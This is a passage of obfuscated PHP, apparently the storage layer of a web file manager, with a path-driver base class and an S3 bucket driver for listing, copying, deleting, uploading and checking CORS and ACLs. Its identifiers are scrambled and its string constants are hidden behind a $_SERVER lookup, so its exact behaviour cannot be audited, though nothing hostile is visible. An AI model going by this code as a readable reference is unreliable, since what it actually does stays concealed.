$CÑÙ–ç‚è); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto B¯«¸¥÷ç•; cì°ÔÌîœ‹: } public function fileOutImageServer($a¼Ó‰Å‘é, $dÈÄ„‚ê = 250) { $this->fileOutImage($a¼Ó‰Å‘é, $dÈÄ„‚ê); } public function fileNameAuto($CŒ¶²š† ƒ, $cßøÙâÖ¬Ì, $C½«Ğ¼¡—è = REPEAT_RENAME, $bŠ‡Òâêùõ = false) { goto d‰‡Áè®å¯; d‰‡Áè®å¯: $Cğƒò‰æÅ´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C“´ÑÌáøí = $CŒ¶²š† ƒ === $Cğƒò‰æÅ´[33] ? $cßøÙâÖ¬Ì : rtrim($CŒ¶²š† ƒ, $Cğƒò‰æÅ´[8]) . $Cğƒò‰æÅ´[8] . $cßøÙâÖ¬Ì; if ($C½«Ğ¼¡—è == REPEAT_REPLACE || !$this->exist($C“´ÑÌáøí) || $bŠ‡Òâêùõ && $C½«Ğ¼¡—è != REPEAT_RENAME_FOLDER) { return $cßøÙâÖ¬Ì; } goto d‚Ê·Â±Â¦; d‚Ê·Â±Â¦: if ($C½«Ğ¼¡—è == REPEAT_SKIP) { return !1; } $DæË—†Ø’ = $Cğƒò‰æÅ´[104] . get_path_ext($cßøÙâÖ¬Ì); $DæË—†Ø’ = $DæË—†Ø’ == $Cğƒò‰æÅ´[104] || $bŠ‡Òâêùõ ? $Cğƒò‰æÅ´[33] : $DæË—†Ø’; goto añ©øÑïñ”; añ©øÑïñ”: $F†è ‚íÃÆ = 1; $Cº”¨÷â¹ = substr($cßøÙâÖ¬Ì, 0, strlen($cßøÙâÖ¬Ì) - strlen($DæË—†Ø’)); $f‚¨ÚÖ‚µ = $Cº”¨÷â¹ . "\50{$F†è ‚íÃÆ}\x29{$DæË—†Ø’}"; goto eàø¨¤š™; eàø¨¤š™: while ($this->exist(rtrim($CŒ¶²š† ƒ, $Cğƒò‰æÅ´[8]) . $Cğƒò‰æÅ´[8] . $f‚¨ÚÖ‚µ)) { $f‚¨ÚÖ‚µ = $Cº”¨÷â¹ . "\x28{$F†è ‚íÃÆ}\x29{$DæË—†Ø’}"; $F†è ‚íÃÆ++; } return $f‚¨ÚÖ‚µ; goto aÇ‰Ä¿ï; aÇ‰Ä¿ï: } private function fileNameAutoList($dĞŠ—µïù, $e¥„—ëˆÛ±, $a›¦¹ÓÏ“› = false) { goto Bäæë¶Šğ˜; EÓğÒë‰½é: return $BÄÈ‘ÁÆ§‰; goto bÔáÒä©½‹; EÎ©”é‘Ñ†: $aè¶®©§åÆ = array_to_keyvalue($cÙ›ö§Ã¦, $b  ¦¾ƒŸ[33], $b  ¦¾ƒŸ[28]); $cµìÍ…Ÿ¶” = $b  ¦¾ƒŸ[104] . get_path_ext($e¥„—ëˆÛ±); $cµìÍ…Ÿ¶” = $cµìÍ…Ÿ¶” == $b  ¦¾ƒŸ[104] || $a›¦¹ÓÏ“› ? $b  ¦¾ƒŸ[33] : $cµìÍ…Ÿ¶”; goto BºèÈ–ÊäØ; BºèÈ–ÊäØ: $BÅî¬ÎâÙÎ = substr($e¥„—ëˆÛ±, 0, strlen($e¥„—ëˆÛ±) - strlen($cµìÍ…Ÿ¶”)); $BÄÈ‘ÁÆ§‰ = $BÅî¬ÎâÙÎ . "\50\x30\x29{$cµìÍ…Ÿ¶”}"; for ($BÂòÌ¡¿œ‚ = 1; $BÂòÌ¡¿œ‚ <= count($aè¶®©§åÆ) + 1; $BÂòÌ¡¿œ‚++) { $BÄÈ‘ÁÆ§‰ = $BÅî¬ÎâÙÎ . "\50{$BÂòÌ¡¿œ‚}\x29{$cµìÍ…Ÿ¶”}"; if (!in_array_not_case($BÄÈ‘ÁÆ§‰, $aè¶®©§åÆ)) { return $BÄÈ‘ÁÆ§‰; } } goto EÓğÒë‰½é; Bäæë¶Šğ˜: $b  ¦¾ƒŸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÙ›ö§Ã¦ = $this->listPath($dĞŠ—µïù, !0); $cÙ›ö§Ã¦ = array_merge($cÙ›ö§Ã¦[$b  ¦¾ƒŸ[84]], $cÙ›ö§Ã¦[$b  ¦¾ƒŸ[83]]); goto EÎ©”é‘Ñ†; bÔáÒä©½‹: } public function listAllFiles($dÖ˜ÒòÔÉĞ, $b•šËƒÑˆ£, $cÕÅöö‚ŠÙ = array()) { goto e¶©¨¹¤’; D¸­“›¦”½: $dÖ˜ÒòÔÉĞ = trim($dÖ˜ÒòÔÉĞ, $a·á’è™†[8]); foreach ($b•šËƒÑˆ£ as $AÚ¾øÆ×ªÅ) { $A¯—‚ï†ğè = ltrim(substr(trim($AÚ¾øÆ×ªÅ, $a·á’è™†[8]), strlen($dÖ˜ÒòÔÉĞ)), $a·á’è™†[8]); $Dô…¨»Ü‡Å = array_merge($Dô…¨»Ü‡Å, $this->slicePath($A¯—‚ï†ğè)); } $C¥Ş÷„øŒÎ = array(); goto b©æ¬°¾Ş²; b©æ¬°¾Ş²: foreach (array_unique($Dô…¨»Ü‡Å) as $AÚ¾øÆ×ªÅ) { $F±¸É˜Â‚‘ = array($a·á’è™†[85] => $this->getPathOuter($a·á’è™†[8] . $dÖ˜ÒòÔÉĞ . $a·á’è™†[8] . $AÚ¾øÆ×ªÅ), $a·á’è™†[86] => 1, $a·á’è™†[87] => 0); if (substr($AÚ¾øÆ×ªÅ, -1) != $a·á’è™†[8]) { $F±¸É˜Â‚‘[$a·á’è™†[86]] = 0; $e¿µœ¬ÁĞ« = $this->getPath($dÖ˜ÒòÔÉĞ . $a·á’è™†[8] . $AÚ¾øÆ×ªÅ); $F±¸É˜Â‚‘[$a·á’è™†[87]] = isset($cÕÅöö‚ŠÙ[$e¿µœ¬ÁĞ«]) ? $cÕÅöö‚ŠÙ[$e¿µœ¬ÁĞ«] : $this->size($e¿µœ¬ÁĞ«); } $C¥Ş÷„øŒÎ[] = $F±¸É˜Â‚‘; } return $C¥Ş÷„øŒÎ; goto bÏ©ÎòÅ–²; e¶©¨¹¤’: $a·á’è™† =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($b•šËƒÑˆ£)) { return array(); } $Dô…¨»Ü‡Å = array(); goto D¸­“›¦”½; bÏ©ÎòÅ–²: } public function slicePath($AâÔµ¨Ç™¿) { $e×ŸÙÈæò™ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÀ”—É¢¿ = explode($e×ŸÙÈæò™[8], trim($AâÔµ¨Ç™¿, $e×ŸÙÈæò™[8])); $fããíğ„âÚ = 0; do { ++$fããíğ„âÚ; $c´‘¨ô¼Û[] = implode($e×ŸÙÈæò™[8], array_slice($bÀ”—É¢¿, 0, $fããíğ„âÚ)) . $e×ŸÙÈæò™[8]; } while ($fããíğ„âÚ < count($bÀ”—É¢¿)); $c´‘¨ô¼Û[count($bÀ”—É¢¿) - 1] = $AâÔµ¨Ç™¿; return $c´‘¨ô¼Û; } public function getHost() { $cœ„¨ã¸Ô„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eì¥ßôÉ = parse_url(trim($this->domain, $cœ„¨ã¸Ô„[8])); $F•¯èƒø…‹ = isset($eì¥ßôÉ[$cœ„¨ã¸Ô„[183]]) ? $eì¥ßôÉ[$cœ„¨ã¸Ô„[183]] : http_type(); $b‰É‹É•Œ = isset($eì¥ßôÉ[$cœ„¨ã¸Ô„[184]]) ? $eì¥ßôÉ[$cœ„¨ã¸Ô„[184]] : $eì¥ßôÉ[$cœ„¨ã¸Ô„[85]]; if (isset($eì¥ßôÉ[$cœ„¨ã¸Ô„[185]])) { $b‰É‹É•Œ .= $cœ„¨ã¸Ô„[4] . $eì¥ßôÉ[$cœ„¨ã¸Ô„[185]]; } return $F•¯èƒø…‹ . $cœ„¨ã¸Ô„[186] . $b‰É‹É•Œ; } public function pathEncode($D¾ËÊİõÂ») { $A¯ˆÖÅ¹ÒÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return str_replace($A¯ˆÖÅ¹ÒÁ[187], $A¯ˆÖÅ¹ÒÁ[8], rawurlencode($D¾ËÊİõÂ»)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($EÁ¹æÀ²ø„) { set_timeout(); require_once SDK_DIR . $_SERVER[í¤âËÚ£¶íÊ¢][188]; parent::__construct(); $this->_init($EÁ¹æÀ²ø„); } public function _init($f­÷“™Ê”²) { foreach ($f­÷“™Ê”² as $fõ‡Ÿ‚ÄŠ° => $dë÷©—£‘) { if (isset($this->{$fõ‡Ÿ‚ÄŠ°})) { $this->{$fõ‡Ÿ‚ÄŠ°} = $dë÷©—£‘; } } $this->endpoint = $f­÷“™Ê”²[$_SERVER[í¤âËÚ£¶íÊ¢][189]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($E›áîÔò…“ = "\166\64") { $this->signVer = $E›áîÔò…“; $this->client->setSignatureVersion($E›áîÔò…“); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto cœéãê‹ˆ; cœéãê‹ˆ: $Dí¤‘ƒŞëÚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b„†ğŸ°‘ = $this->getBucketCors(); if (!$b„†ğŸ°‘ || !is_array($b„†ğŸ°‘)) { return !1; } goto EÆ†Àâ°¦; EÆ†Àâ°¦: if ($b„†ğŸ°‘[$Dí¤‘ƒŞëÚ[190]] != $Dí¤‘ƒŞëÚ[191] || $b„†ğŸ°‘[$Dí¤‘ƒŞëÚ[192]] != $Dí¤‘ƒŞëÚ[191]) { return !1; } $aêÃ¼³Ş‹˜ = array_map($Dí¤‘ƒŞëÚ[193], $b„†ğŸ°‘[$Dí¤‘ƒŞëÚ[194]]); if (!is_array($aêÃ¼³Ş‹˜)) { $aêÃ¼³Ş‹˜ = array(); } goto DªÇÅÊ–¼±; DªÇÅÊ–¼±: $Dèèä•îÚÃ = array($Dí¤‘ƒŞëÚ[195], $Dí¤‘ƒŞëÚ[196], $Dí¤‘ƒŞëÚ[197], $Dí¤‘ƒŞëÚ[198], $Dí¤‘ƒŞëÚ[199]); $E•å‘ï¨˜ò = array_diff($Dèèä•îÚÃ, $aêÃ¼³Ş‹˜); return empty($E•å‘ï¨˜ò); goto Fº®©Š¥‡Ä; Fº®©Š¥‡Ä: } public function mkfile($F´ˆ», $CÔÚ¡…¸­¹ = '', $eöŒèôÜ¼ƒ = REPEAT_RENAME) { $A”²¦Åœ—Ø = $this->setContent($F´ˆ», $CÔÚ¡…¸­¹); if ($A”²¦Åœ—Ø !== !1) { return $this->getPathOuter($F´ˆ»); } return !1; } public function mkdir($aÖÍß¹À‹Ë, $Dƒ˜‹¦Âˆ = REPEAT_SKIP) { if (empty($aÖÍß¹À‹Ë)) { return !1; } if ($this->_isFolder($aÖÍß¹À‹Ë)) { return $this->getPathOuter($aÖÍß¹À‹Ë); } $AÀ¹ëÀÂ¤÷ = $this->setContent($aÖÍß¹À‹Ë, $_SERVER[í¤âËÚ£¶íÊ¢][33], !0); if ($AÀ¹ëÀÂ¤÷ !== !1) { return $this->getPathOuter($aÖÍß¹À‹Ë); } return !1; } public function copyFile($dí…Ò¿‚ç, $C¥™œŠ”, $Aè¥ÔÂÍãÑ = array()) { $cÂ˜ÀÑÉ³ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f¾˜ºîÑ¢‹ = $this->objectMeta($dí…Ò¿‚ç); if (!$f¾˜ºîÑ¢‹) { return !1; } if ($f¾˜ºîÑ¢‹[$cÂ˜ÀÑÉ³[87]] <= 1024 * 1024 * 200) { $bÅÊ‚†Éˆñ = $this->client->copyObject($this->bucket, $dí…Ò¿‚ç, $this->bucket, $C¥™œŠ”, $cÂ˜ÀÑÉ³[200], $Aè¥ÔÂÍãÑ); } else { $bÅÊ‚†Éˆñ = $this->client->multiCopyObject($this->bucket, $dí…Ò¿‚ç, $this->bucket, $C¥™œŠ”, $Aè¥ÔÂÍãÑ); } $bÅÊ‚†Éˆñ = $bÅÊ‚†Éˆñ ? $this->getPathOuter($C¥™œŠ”) : !1; return $bÅÊ‚†Éˆñ; } public function moveFile($D¥¬µ‘³¸, $E‡‚Í…Óã„) { if ($this->copyFile($D¥¬µ‘³¸, $E‡‚Í…Óã„)) { $this->delFile($D¥¬µ‘³¸); return $this->getPathOuter($E‡‚Í…Óã„); } return !1; } public function delFile($CÛˆ©Ò³×’) { return $this->client->deleteObject($this->bucket, $CÛˆ©Ò³×’); } public function delFolder($CĞ¶ó ßç­) { goto e±¾ßÂ¬±İ; e±¾ßÂ¬±İ: $E½ÒÒÜÊ½Í =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$this->exist($CĞ¶ó ßç­)) { return !0; } $this->listItemCache = !1; goto déÙ ËÏÚÒ; d±›¿Âô×Œ: if (!empty($CĞ¶ó ßç­) && !in_array($e‚‰ÕŒÇÇğ, $EñÄÂÆšÈ‰[$E½ÒÒÜÊ½Í[84]])) { $EñÄÂÆšÈ‰[$E½ÒÒÜÊ½Í[84]][] = $e‚‰ÕŒÇÇğ; } $AÍ´›ƒÛĞİ = $this->delByBatch($EñÄÂÆšÈ‰[$E½ÒÒÜÊ½Í[83]]); if (!$AÍ´›ƒÛĞİ) { return !1; } goto dºì–çÒºï; dºì–çÒºï: return $this->delByBatch($EñÄÂÆšÈ‰[$E½ÒÒÜÊ½Í[84]]); goto eë¸ôÑÚ£ê; déÙ ËÏÚÒ: $EñÄÂÆšÈ‰ = $this->fileList($CĞ¶ó ßç­); $this->listItemCache = !0; $e‚‰ÕŒÇÇğ = trim($CĞ¶ó ßç­, $E½ÒÒÜÊ½Í[8]) . $E½ÒÒÜÊ½Í[8]; goto d±›¿Âô×Œ; eë¸ôÑÚ£ê: } private function delByBatch($aöˆ ¸À±) { foreach (array_chunk($aöˆ ¸À±, 1000) as $DÆ•öã° ·) { $DÔÅîà§é = $this->client->deleteObjects($this->bucket, $DÆ•öã° ·); if (!$DÔÅîà§é) { return !1; } } return !0; } public function rename($cêˆå²‰ìª, $F­«°ÅŒÉ) { return $this->renameObject($cêˆå²‰ìª, $F­«°ÅŒÉ); } public function listPath($A¡æ Òéì­, $EÉËƒ¢ê‘Ë = false) { $E®†°¯¢˜« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A½ğ¸´×éµ = $this->fileList($A¡æ Òéì­, $E®†°¯¢˜«[8], !0); foreach ($A½ğ¸´×éµ[$E®†°¯¢˜«[84]] as $BŞƒÊµì => $Dë¥Ëìïæ†) { $A½ğ¸´×éµ[$E®†°¯¢˜«[84]][$BŞƒÊµì] = $this->folderInfo($Dë¥Ëìïæ†, $EÉËƒ¢ê‘Ë); } foreach ($A½ğ¸´×éµ[$E®†°¯¢˜«[83]] as $BŞƒÊµì => $Dë¥Ëìïæ†) { $A½ğ¸´×éµ[$E®†°¯¢˜«[83]][$BŞƒÊµì] = $this->fileInfo($Dë¥Ëìïæ†[$E®†°¯¢˜«[28]], $EÉËƒ¢ê‘Ë, $Dë¥Ëìïæ†); } return $A½ğ¸´×éµ; } private function fileInfo($A‹ÂÈøôÁ‹, $bÚŒ‡ÌÌøÎ = false, $d¼áã ºí† = array()) { goto BÂà¾ç™ÂÏ; fÉ–Úãñó: $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[202]] = $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[93]] = 0; $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[203]] = $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[204]] = !0; if (empty($d¼áã ºí†)) { $d¼áã ºí† = $this->objectMeta($A‹ÂÈøôÁ‹); if (!$d¼áã ºí†) { return $DƒÎ¯ÑİÉ–; } } goto f¢ˆ³ÍŸ¡; f¢ˆ³ÍŸ¡: if (isset($d¼áã ºí†[$EÚŒäŠ½Š[205]])) { $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[93]] = $d¼áã ºí†[$EÚŒäŠ½Š[205]]; } if (isset($d¼áã ºí†[$EÚŒäŠ½Š[87]])) { $DƒÎ¯ÑİÉ–[$EÚŒäŠ½Š[87]] = $d¼áã ºí†[$EÚŒäŠ½Š[87]]; } return $DƒÎ¯ÑİÉ–; goto AÍÍÂÑœÈ; BÂà¾ç™ÂÏ: $EÚŒäŠ½Š =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DƒÎ¯ÑİÉ– = array($EÚŒäŠ½Š[28] => $this->pathThis($A‹ÂÈøôÁ‹), $EÚŒäŠ½Š[85] => $this->getPathOuter($A‹ÂÈøôÁ‹), $EÚŒäŠ½Š[29] => $EÚŒäŠ½Š[201], $EÚŒäŠ½Š[177] => $this->ext($A‹ÂÈøôÁ‹), $EÚŒäŠ½Š[87] => isset($d¼áã ºí†[$EÚŒäŠ½Š[87]]) ? $d¼áã ºí†[$EÚŒäŠ½Š[87]] : 0); if ($bÚŒ‡ÌÌøÎ) { return $DƒÎ¯ÑİÉ–; } goto fÉ–Úãñó; AÍÍÂÑœÈ: } private function folderInfo($CÒ¦Ç¹„™, $CĞ½Ç©¯ÜÆ = false) { goto dôøäİˆ†; c³º¾ÑÕÑè: $c²óˆÂ‘º [$b„‰Í ˆ§˜[202]] = $c²óˆÂ‘º [$b„‰Í ˆ§˜[93]] = 0; $c²óˆÂ‘º [$b„‰Í ˆ§˜[203]] = $c²óˆÂ‘º [$b„‰Í ˆ§˜[204]] = !0; if ($CÒ¦Ç¹„™ == $b„‰Í ˆ§˜[33]) { return $c²óˆÂ‘º ; } goto a´ÚÎ‘Üàä; dôøäİˆ†: $b„‰Í ˆ§˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c²óˆÂ‘º  = array($b„‰Í ˆ§˜[28] => $this->pathThis($CÒ¦Ç¹„™), $b„‰Í ˆ§˜[85] => $this->getPathOuter($b„‰Í ˆ§˜[8] . $CÒ¦Ç¹„™), $b„‰Í ˆ§˜[29] => $b„‰Í ˆ§˜[86]); if ($CĞ½Ç©¯ÜÆ) { return $c²óˆÂ‘º ; } goto c³º¾ÑÕÑè; Fƒ‘ô­‡“£: return $c²óˆÂ‘º ; goto AêŠêàŠŠß; a´ÚÎ‘Üàä: $CÒ¦Ç¹„™ = trim($CÒ¦Ç¹„™, $b„‰Í ˆ§˜[8]) . $b„‰Í ˆ§˜[8]; $f»‡Ö§êË = $this->objectMeta($CÒ¦Ç¹„™); if (isset($f»‡Ö§êË[$b„‰Í ˆ§˜[205]])) { $c²óˆÂ‘º [$b„‰Í ˆ§˜[202]] = $f»‡Ö§êË[$b„‰Í ˆ§˜[205]]; } goto Fƒ‘ô­‡“£; AêŠêàŠŠß: } private function fileList($bª…‹Æ‰±«, $d·©šˆ›—“ = '', $fÆÑšÅŠ– = 0) { goto cÙ­­„÷; aŸ¦í­³˜ª: if (!$E…Š×™‘‚Œ) { return array($C¼ÃÃ‚ùÌù[84] => array(), $C¼ÃÃ‚ùÌù[83] => array()); } $F¿‹È¥£âí = $this->listItemCache === !1 ? !1 : !0; $f´¡ÅÚ¬Á = $cßŒâ©à‰  = array(); goto bêÉØ‰ŒÊè; bêÉØ‰ŒÊè: foreach ($E…Š×™‘‚Œ[$C¼ÃÃ‚ùÌù[206]] as $bƒŠ¿İâĞİ) { goto C„ŞÉ³¤‘Ê; CÉ´çè½Šô: $A¾¿†é¥ñ· = $eÕÙÇ¬É„¥ == 0 && substr($eò¥¶¶£Ä, strlen($eò¥¶¶£Ä) - 1, 1) == $C¼ÃÃ‚ùÌù[8] ? !0 : !1; if ($F¿‹È¥£âí) { $this->cacheMethod($C¼ÃÃ‚ùÌù[207], $eò¥¶¶£Ä, $A¾¿†é¥ñ·); $this->cacheMethod($C¼ÃÃ‚ùÌù[208], $eò¥¶¶£Ä, $bƒŠ¿İâĞİ); } if ($A¾¿†é¥ñ·) { $f´¡ÅÚ¬Á[] = $eò¥¶¶£Ä; continue; } goto cÁî»±‘ù; cÁî»±‘ù: $cßŒâ©à‰ [] = $fÆÑšÅŠ– ? $bƒŠ¿İâĞİ : $eò¥¶¶£Ä; goto D­¤äåîÓ¯; C„ŞÉ³¤‘Ê: $eò¥¶¶£Ä = $bƒŠ¿İâĞİ[$C¼ÃÃ‚ùÌù[28]]; if ($eò¥¶¶£Ä == $Aœñóë›—) { continue; } $eÕÙÇ¬É„¥ = isset($bƒŠ¿İâĞİ[$C¼ÃÃ‚ùÌù[87]]) ? $bƒŠ¿İâĞİ[$C¼ÃÃ‚ùÌù[87]] : 0; goto CÉ´çè½Šô; D­¤äåîÓ¯: } foreach ($E…Š×™‘‚Œ[$C¼ÃÃ‚ùÌù[209]] as $bƒŠ¿İâĞİ) { $f´¡ÅÚ¬Á[] = $bƒŠ¿İâĞİ[$C¼ÃÃ‚ùÌù[28]]; if ($F¿‹È¥£âí) { $this->cacheMethod($C¼ÃÃ‚ùÌù[207], $bƒŠ¿İâĞİ[$C¼ÃÃ‚ùÌù[28]], !0); } } if ($F¿‹È¥£âí) { $this->cacheMethod($C¼ÃÃ‚ùÌù[207], $bª…‹Æ‰±«, !0); } goto f£ñ›ùŸŸÑ; cÙ­­„÷: $C¼ÃÃ‚ùÌù =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Aœñóë›— = rtrim($bª…‹Æ‰±«, $C¼ÃÃ‚ùÌù[8]) . $C¼ÃÃ‚ùÌù[8]; $E…Š×™‘‚Œ = $this->listObjs($Aœñóë›—, null, null, $d·©šˆ›—“); goto aŸ¦í­³˜ª; f£ñ›ùŸŸÑ: return array($C¼ÃÃ‚ùÌù[84] => $f´¡ÅÚ¬Á, $C¼ÃÃ‚ùÌù[83] => $cßŒâ©à‰ ); goto fçõ„¥¡äÈ; fçõ„¥¡äÈ: } private function listObjs($eø£å»»ƒ—, $cìİ‹“«æŒ = null, $F™«¾Ç®ğ½ = null, $døÙŞõ«¡ƒ = null) { $cõÎ²Â‘Ñ– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eø£å»»ƒ— = trim($eø£å»»ƒ—, $cõÎ²Â‘Ñ–[8]); $F¢Ä™³‘Ö = empty($eø£å»»ƒ—) ? $cõÎ²Â‘Ñ–[33] : $eø£å»»ƒ— . $cõÎ²Â‘Ñ–[8]; return $this->client->getBucket($this->bucket, $F¢Ä™³‘Ö, $cìİ‹“«æŒ, $F™«¾Ç®ğ½, $døÙŞõ«¡ƒ, !0); } public function has($Dæù›Ä¸Ãé, $AœÂØÆîÀ = false, $fåãòËˆ¿¿ = true) { goto Bñ½¾¡Ø‘®; A§™­™»Á: return !1; goto dá°†’ÑÃ«; b‡ôîäÔåâ: $EÇÕÒˆÚ© = null; $D®•ªÇÅÅ´ = 500; $d©¹ùõ¿÷é = $B¿ˆ­Ö½Î [8]; goto dîôôÒÙ Ë; dîôôÒÙ Ë: $eäô¾ö¥›¢ = $böîˆ¤¸â¿ = array(); while (!0) { $aÒœ×Â„Ï = $this->listObjs($Dæù›Ä¸Ãé, $EÇÕÒˆÚ©, $D®•ªÇÅÅ´, $d©¹ùõ¿÷é); if (!$aÒœ×Â„Ï) { break; } $EÇÕÒˆÚ© = $aÒœ×Â„Ï[$B¿ˆ­Ö½Î [210]]; $fÖ½ŒÀô´¸ = $aÒœ×Â„Ï[$B¿ˆ­Ö½Î [206]]; $C„¶ç²— = $aÒœ×Â„Ï[$B¿ˆ­Ö½Î [209]]; if (empty($fÖ½ŒÀô´¸) && empty($C„¶ç²—)) { break; } if (count($fÖ½ŒÀô´¸) == 1 && $fÖ½ŒÀô´¸[0][$B¿ˆ­Ö½Î [28]] == $E´…£Œº¾) { break; } if ($AœÂØÆîÀ) { if (count($fÖ½ŒÀô´¸)) { $fÖ½ŒÀô´¸ = array_column($fÖ½ŒÀô´¸, $B¿ˆ­Ö½Î [28]); $eäô¾ö¥›¢ = array_merge($eäô¾ö¥›¢, $fÖ½ŒÀô´¸); } if (count($C„¶ç²—)) { $C„¶ç²— = array_column($C„¶ç²—, $B¿ˆ­Ö½Î [28]); $böîˆ¤¸â¿ = array_merge($böîˆ¤¸â¿, $C„¶ç²—); } if ($EÇÕÒˆÚ© === null) { break; } continue; } if ($fåãòËˆ¿¿) { if (!empty($fÖ½ŒÀô´¸)) { if (count($fÖ½ŒÀô´¸) > 1 || isset($fÖ½ŒÀô´¸[0][$B¿ˆ­Ö½Î [28]]) && $fÖ½ŒÀô´¸[0][$B¿ˆ­Ö½Î [28]] != $E´…£Œº¾) { return !0; } } } else { if (!empty($C„¶ç²—)) { return !0; } } if ($EÇÕÒˆÚ© === null) { break; } } if ($AœÂØÆîÀ) { $eäô¾ö¥›¢ = array_diff($eäô¾ö¥›¢, array($E´…£Œº¾)); $eäô¾ö¥›¢ = count(array_unique($eäô¾ö¥›¢)); $böîˆ¤¸â¿ = count(array_unique($böîˆ¤¸â¿)); return array($B¿ˆ­Ö½Î [211] => $eäô¾ö¥›¢, $B¿ˆ­Ö½Î [212] => $böîˆ¤¸â¿); } goto A§™­™»Á; Bñ½¾¡Ø‘®: $B¿ˆ­Ö½Î  =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dæù›Ä¸Ãé = trim($Dæù›Ä¸Ãé, $B¿ˆ­Ö½Î [8]); $E´…£Œº¾ = empty($Dæù›Ä¸Ãé) ? $B¿ˆ­Ö½Î [33] : $Dæù›Ä¸Ãé . $B¿ˆ­Ö½Î [8]; goto b‡ôîäÔåâ; dá°†’ÑÃ«: } public function listAll($aÖ¡øĞŒÅ§) { $eªµŒæ§ÖÚ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A¸ê‡§Š = $this->fileList($aÖ¡øĞŒÅ§, $eªµŒæ§ÖÚ[33], !0); $D„Õ©î¢½± = array(); foreach ($A¸ê‡§Š[$eªµŒæ§ÖÚ[83]] as $C®ç†ÒÂ) { $D„Õ©î¢½±[$C®ç†ÒÂ[$eªµŒæ§ÖÚ[28]]] = $C®ç†ÒÂ[$eªµŒæ§ÖÚ[87]]; } foreach ($A¸ê‡§Š[$eªµŒæ§ÖÚ[84]] as $C®ç†ÒÂ) { if (is_string($C®ç†ÒÂ)) { $D„Õ©î¢½±[$C®ç†ÒÂ] = 0; } } return $this->listAllFiles($aÖ¡øĞŒÅ§, array_keys($D„Õ©î¢½±), $D„Õ©î¢½±); } public function canRead($EØ¢ãŠÆŞ„) { $cÍÂÏ’ŞÈ– =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AïÕÇŒÜ = $this->client->getAccessControlPolicy($this->bucket, $EØ¢ãŠÆŞ„); if (!$AïÕÇŒÜ) { return !1; } return in_array($AïÕÇŒÜ, array($cÍÂÏ’ŞÈ–[213], $cÍÂÏ’ŞÈ–[214], $cÍÂÏ’ŞÈ–[215])) ? !0 : !1; } public function canWrite($BÉÎİ¼¯„Û) { $fèÀé†Œƒ© =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e²“ô°ë÷ = $this->client->getAccessControlPolicy($this->bucket, $BÉÎİ¼¯„Û); if (!$e²“ô°ë÷) { return !1; } return in_array($e²“ô°ë÷, array($fèÀé†Œƒ©[213], $fèÀé†Œƒ©[214])) ? !0 : !1; } public function getContent($DíãööŒº÷) { return $this->client->getObject($this->bucket, $DíãööŒº÷); } public function setContent($E´–ö†ùÆ”, $A‡¤óê¼Î´ = '', $B‘õÙˆŒ‡º = false) { goto DŒª¹Ñ¯•; DŒª¹Ñ¯•: $fæ óËòÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E´–ö†ùÆ” = $B‘õÙˆŒ‡º ? trim($E´–ö†ùÆ”, $fæ óËòÛ[8]) . $fæ óËòÛ[8] : $E´–ö†ùÆ”; $Cö¡ÍßåöÎ = get_file_mime(get_path_ext($E´–ö†ùÆ”)); goto b¢×‹ˆòó†; b¢×‹ˆòó†: $F½…È×éµ = $this->client->putObject($A‡¤óê¼Î´, $this->bucket, $E´–ö†ùÆ”, $fæ óËòÛ[200], array(), $Cö¡ÍßåöÎ); if (!$F½…È×éµ) { return !1; } if ($B‘õÙˆŒ‡º) { return !0; } goto dÉªÈÏì…; dÉªÈÏì…: $this->cacheMethod(null, null); $F½…È×éµ = $this->copyFile($E´–ö†ùÆ”, $E´–ö†ùÆ”, array($fæ óËòÛ[216] => $F½…È×éµ[$fæ óËòÛ[217]])); return $F½…È×éµ ? !0 : !1; goto a‘¡Úï»µ¶; a‘¡Úï»µ¶: } public function fileSubstr($DÃ¢ãÚˆÄè, $bÖ£¢¾¢, $F‘ù…’™) { $E‡™Ê–šÕõ = $bÖ£¢¾¢ + $F‘ù…’™ - 1; return $this->client->getObject($this->bucket, $DÃ¢ãÚˆÄè, array($_SERVER[í¤âËÚ£¶íÊ¢][218] => "\x62\x79\164\145\163\75{$bÖ£¢¾¢}\55{$E‡™Ê–šÕõ}")); } public function upload($E—…›ÖéÛø, $bè÷ñ°‰„İ, $D‡“‘ËèÑ‘ = false, $cŒ…ß¦ÔĞÄ = REPEAT_REPLACE) { $eÑğ‹£ÃÑ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÊ¤‹¨»ƒ = array($eÑğ‹£ÃÑ[216] => @md5_file($bè÷ñ°‰„İ)); $cœã‰›­› = array($eÑğ‹£ÃÑ[219] => get_file_mime(get_path_ext($E—…›ÖéÛø))); if (IO::size($bè÷ñ°‰„İ) <= 1024 * 1024 * 200) { $Fèä²„‹–¾ = 